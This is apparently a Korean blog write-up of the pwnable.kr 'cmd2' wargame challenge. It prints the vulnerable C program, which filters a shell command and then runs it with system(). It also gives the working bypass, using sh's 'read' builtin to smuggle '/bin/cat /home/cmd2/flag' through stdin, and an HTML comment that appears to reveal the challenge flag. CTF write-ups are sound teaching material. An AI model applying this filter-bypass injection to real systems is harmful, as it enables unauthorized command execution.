---
title: "pwnable.kr - Toddler's bottle #14 cmd2"
date: 2020-03-08
categories:
  - Information Security
tags:
  - pwnable.kr
---

[pwnable.kr][pwnable.kr] Toddler's bottle의 #14 cmd2 문제 풀이

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}

extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
}

```

delete_env는 environment variable을 모두 삭제하는 내용이다. extern char** environ에 대해서는 man environ 해보면 자세한 내용이 설명되어 있다.

argv를 통해서 뭘 등록시켜 보려고 해도 export고 PATH고 =고 전부 ban word라 안된다

working directory를 /bin으로 하고 실행해보면 뭐가 될까 싶었는데 /가 안되서 아무것도 실행할수 없다. /를 대체할수 있는 뭔가 있는가 싶어 찾아봤지만 안된다

어떻게 풀어야 할지 난감했는데 실험하다 보니 echo나 pwd같은 명령어는 잘 된다는 것을 확인. 나는 이게 /bin에 있는 binary인줄 알았는데 그렇다면 ls나 cat과 마찬가지로 안되어야 하므로 sh의 내장명령어 같은거일거라고 짐작했다.

[sh에 대해 잘 설명되어 있는곳][sh_explain_link]

그중에 이런게 있었다
~~~
read [-r] name ...	
One line is read from the standard input; successive words of the input are assigned to the variables name in order, with leftover words to the last variable. The return code is 0 unless end-of-file is encountered. Normally, backslashes escape the following character; this is inhibited if the -r option is given.
~~~

대략 read xxx yyy 하고 실행하면 stdin으로 input을 받고, 이 input을 word 단위로 tokenize하여 xxx, yyy에 넣는다고 한다. 그리고 word의 숫자가 input보다 크면 마지막 variable에 전부가 들어간다고 한다. 대략 아래처럼 됨

~~~
cmd2@pwnable:~$ read i_ls i_ps && $i_ls && $i_ps
ls ps
cmd2  cmd2.c  flag
error: can not access /proc   # 서버에서 ps할 수 있는 권한이 없어서 이렇게 뜸
~~~

내가 stdin으로 주는 것은 filtering을 안하니까 이를 통해 실행시키면 되겠다 싶어 해봤고, 성공함

~~~
cmd2@pwnable:~$ ./cmd2 "read input && \$input"
read input && $input
/bin/cat /home/cmd2/flag
<tag output>
~~~

writeup을 보니 이것 외에도 여러 기상천외한 solution이 있는듯? 공통점은 sh command를 잘 사용해서 푼다는 점

[pwnable.kr]: https://pwnable.kr
[sh_explain_link]: https://www.computerhope.com/unix/ush.htm

<!-- FuN_w1th_5h3ll_v4riabl3s_haha -->